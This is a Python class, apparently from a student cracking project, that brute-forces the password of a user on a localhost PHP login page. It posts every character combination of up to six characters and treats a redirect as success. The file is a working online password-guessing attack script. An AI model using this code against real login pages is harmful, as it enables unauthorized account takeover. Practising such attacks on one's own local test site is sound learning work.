import time
import string
import requests

from Cracker import Cracker

class CrackerBrutForce (Cracker):
    def __init__(self):
        pass
    
    def find_passwd(self)-> None:
        characters = list ((string.ascii_letters+string.digits+string.punctuation))
        print("Attaque en cours...")
        start = time.time()
        find = True
        
        url = 'http://localhost/cracking-project/project/index.php'
        payload = {
            'username': 'Pa-Alioune',
            'pass' : ""
        }        
        for character in characters:
            payload['pass'] = character     
            with requests.Session() as s:
                s.get(url)
                r = s.post(url, data=payload)
                if (r.history):
                    find = False
                    break
                
        if(find):      
            for first_character in characters:
                for second_character in characters:
                    word = first_character + second_character
                    payload['pass'] = word     
                    with requests.Session() as s:
                        s.get(url)
                        r = s.post(url, data=payload)
                        if (r.history):
                            find = False
                            break
                if (not find):
                    break
                
        if (find):
            for first_character in characters:
                for second_character in characters:
                    for third_character in characters:
                        word = first_character + second_character +third_character
                        payload['pass'] = word     
                        with requests.Session() as s:
                            s.get(url)
                            r = s.post(url, data=payload)
                            if (r.history):
                                find = False
                                break
                    if (not find):
                        break
                if (not find):
                    break
                
        if(find):
            for first_character in characters:
                for second_character in characters:
                    for third_character in characters:
                        for fourth_character in characters:
                            word =  first_character + second_character +third_character + fourth_character
                            payload['pass'] = word     
                            with requests.Session() as s:
                                s.get(url)
                                r = s.post(url, data=payload)
                                if (r.history):
                                    find = False
                                    break
                        if (not find):
                            break
                    if (not find):
                        break
                if (not find):
                    break
        
            if(find):
                for first_character in characters:
                    for second_character in characters:
                        for third_character in characters:
                            for fourth_character in characters:
                                for fifth_character in characters:
                                    word =  first_character + second_character +third_character + fourth_character + fifth_character
                                    payload['pass'] = word     
                                    with requests.Session() as s:
                                        s.get(url)
                                        r = s.post(url, data=payload)
                                        if (r.history):
                                            find = False
                                            break
                                if (not find):
                                    break
                            if (not find):
                                break
                        if (not find):
                            break
                    if (not find):
                        break
                    
                if(find):
                    for first_character in characters:
                        for second_character in characters:
                            for third_character in characters:
                                for fourth_character in characters:
                                    for fifth_character in characters:
                                        for sixth_character in characters:
                                            word =  first_character + second_character +third_character + fourth_character + fifth_character + sixth_character
                                            payload['pass'] = word     
                                            with requests.Session() as s:
                                                s.get(url)
                                                r = s.post(url, data=payload)
                                                if (r.history):
                                                    find = False
                                                    break
                                        if (not find):
                                            break
                                    if (not find):
                                        break
                                if (not find):
                                    break
                            if (not find):
                                break
                        if (not find):
                            break
                                                 
        duration = time.ctime(time.time() - start)[11:19]
        print("\nBingo 🤩")
        print(f"Le mot de passe de ton compte est \"{payload['pass']}\".")
        print(f"Cela nous a pris {duration}s pour le retrouver.")
    
    